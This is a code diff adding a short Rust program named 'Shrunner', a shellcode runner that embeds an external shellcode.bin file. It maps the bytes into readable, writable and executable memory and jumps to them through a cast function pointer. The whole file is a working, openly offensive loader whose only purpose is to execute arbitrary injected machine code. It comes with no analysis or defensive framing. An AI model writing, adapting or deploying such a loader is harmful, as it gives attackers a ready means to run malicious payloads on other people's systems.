@@ -1,0 +1,32 @@
+/*
+ * Shrunner
+ * Shell Code Runner inspired by Sylvain Kerkour (kerkour.com)
+ * 
+ */
+
+use mmap::{MapOption::{MapExecutable, MapReadable, MapWritable}, MemoryMap};
+use std::slice::from_raw_parts_mut;
+use std::io::Write;
+
+const SHELLCODE: &[u8] = include_bytes!("..\\shellcode.bin");
+
+fn main() 
+{
+    unsafe
+    {
+        // Allocate some memory
+        let map = MemoryMap::new(SHELLCODE.len(), &[MapReadable, MapWritable, MapExecutable]).unwrap();
+        
+        // Copy shellcode to the mmapped memory addr
+        // Get the addr of the mapped memory and cast it as a pointer to the first byte
+        let mut dst = from_raw_parts_mut(map.data() as usize as *mut u8, SHELLCODE.len());
+        // "memcpy"
+        dst.write(SHELLCODE).unwrap();
+   
+        // Cast the mmapped addr as a raw ptr, then as a function ptr
+        let shellc = &(map.data() as usize) as *const usize as *const fn();
+        // Exec shell code
+        (*shellc)()
+    }
+}
+
